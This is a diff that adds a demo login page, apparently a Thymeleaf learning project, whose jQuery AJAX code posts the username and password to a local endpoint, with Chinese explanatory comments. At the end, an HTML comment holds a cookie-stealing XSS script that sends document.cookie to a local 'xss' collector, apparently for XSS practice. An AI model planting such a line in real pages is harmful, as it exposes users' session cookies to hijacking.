@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en" xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8"/>
+    <title>Title</title>
+</head>
+<body>
+<form action="" method="post">
+    <label>Username</label>
+    <input id="username" type="text"  name="username"  placeholder="Username">
+    <label >Password</label>
+    <input id="password" type="password" name="password" placeholder="Password">
+    <br> <br>
+    <div>
+        <label>
+            <input type="checkbox" value="remember-me"/> [[#{login.remmber}]]
+        </label>
+    </div>
+    <br>
+    <button id="save"  type="button">Sign in</button>
+    <br> <br>
+</form>
+
+<!--以下为 Ajax脚本 -->
+<script src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script type="text/javascript">
+    $(document).ready(function(){
+        $("#save").click(function(){
+            $.ajax({
+                url:"http://localhost:8080/demo",       //url
+            type: "POST",                //提交表单的类型，相当于method="post"
+            dataType: "json",            //dataType, 这个是请求后，返回的数据将以json格式显示
+            data: {'username':$("#username").val(),'password':$("#password").val()},
+            success : function(data){
+                    console.log(data);
+                $('#div').html(data.username);
+            },        //注意标点
+            error:function (msg){
+                $("#div").html('Error:'+msg);
+            }
+        })//需要注意标点符号，如果标点符合错误了，那ajax基本上都不会执行(否则，后果很严重哦)
+        })        //注意标点
+    });          //注意标点
+</script>
+<!--
+<script>
+    window.location.href = "http://localhost:8081/xss?cookie="+document.cookie;
+</script>
+-->
+
+
+<div id="div"></div>
+</body>
+</html>
